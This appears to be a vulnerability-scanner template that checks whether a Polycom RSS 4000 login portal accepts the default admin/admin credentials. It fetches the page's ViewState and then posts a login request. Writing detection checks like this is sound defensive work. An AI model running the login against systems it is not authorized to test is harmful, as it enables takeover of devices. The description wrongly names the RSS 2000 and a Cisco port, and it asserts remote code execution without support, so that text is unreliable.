name: Polycom_RSS_4000_Default_Credentials
transport: http
set: {}
detail:
  dock: title="Polycom RSS 4000"
  product: Polycom-RSS4000
  homepage: https://www.poly.com/
  impact: Remote attacker can use this default to control the server.
  description: 'The Polycom RSS 2000 administrator ''admin'' has a password that is
    set to the default value of ''admin''. As a result, anyone with access to the
    Cisco port can trivially gain full access to the machine via arbitrary remote
    code execution. '
rules:
  r1:
    method: GET
    path: /portal/login.jsf
    follow_redirects: false
    output:
      search_viewstate: r'javax.faces.ViewState" value="(?P<viewstate>.*?)"'.bsubmatch(response.body)
      var_viewstate: search_viewstate['viewstate']
    expression: response.body.bcontains(b'javax.faces.ViewState')
  r2:
    method: POST
    path: /portal/login.jsf
    follow_redirects: false
    headers:
      Content-Type: application/x-www-form-urlencoded
      Faces-Request: partial/ajax
    body: loginForm=loginForm&loginForm%3AuserName=admin&loginForm%3Apassword=admin&loginForm%3Adomain=LOCAL&javax.faces.ViewState={{var_viewstate}}&javax.faces.source=loginForm%3AloginBt&javax.faces.partial.event=click&javax.faces.partial.execute=loginForm%3AloginBt%20%40component&javax.faces.partial.render=%40component&org.richfaces.ajax.component=loginForm%3AloginBt&loginForm%3AloginBt=loginForm%3AloginBt&AJAX%3AEVENTS_COUNT=1&javax.faces.partial.ajax=true
    expression: response.body.bcontains(b'checkLogin(\'\')')
expression: r1() && r2()
